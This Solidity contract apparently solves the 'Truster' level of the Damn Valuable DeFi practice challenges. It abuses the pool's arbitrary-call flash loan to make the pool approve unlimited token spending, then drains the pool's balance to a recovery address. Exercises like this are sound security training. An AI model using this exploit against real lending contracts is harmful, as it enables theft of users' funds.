pragma solidity ^0.8.0;

import {DamnValuableToken} from "../DamnValuableToken.sol";
import {TrusterLenderPool} from "./TrusterLenderPool.sol";

contract AttackTruster {
    DamnValuableToken public token;
    TrusterLenderPool public pool;
    address public recovery;
    address public owner;
    constructor(address _token,address _pool,address _recovery) {
        owner = msg.sender;
        token = DamnValuableToken(_token);
        pool = TrusterLenderPool(_pool);
        recovery = _recovery;
    }
    function attack() public {
        require(msg.sender == owner, "Not owner");
        bytes memory data = abi.encodeWithSelector(token.approve.selector, address(this), type(uint256).max);
        pool.flashLoan(0, address(this), address(token), data);
        token.transferFrom(address(pool), address(this), token.balanceOf(address(pool)));
        token.transfer(address(recovery), token.balanceOf(address(this)));
    }

}   